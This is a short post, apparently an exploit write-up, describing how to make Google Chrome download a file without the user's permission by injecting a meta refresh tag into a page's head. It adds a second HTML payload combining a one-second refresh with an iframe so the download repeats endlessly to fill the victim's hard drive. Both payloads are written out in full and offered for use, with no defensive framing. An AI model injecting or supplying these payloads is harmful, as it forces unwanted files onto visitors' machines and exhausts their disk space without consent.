To have a file automatically start downloading through google chrome
without the users permission is very easy, simple inject the meta
refresh tag into the head of a web document. 

<head><META http-equiv="refresh" content="1;URL=link to file"> </head>

To have Google Chrome automatically download and repeat downloading 
to take up hard driver space, you can inject the meta refresh tag
into the head of any web document and have a iframe start downloading
a file every time the page refreshes. 

<head> <META http-equiv="refresh" content="1;URL=sploit.html"> </head>
<body> <iframe src="link to file" </iframe> </body>
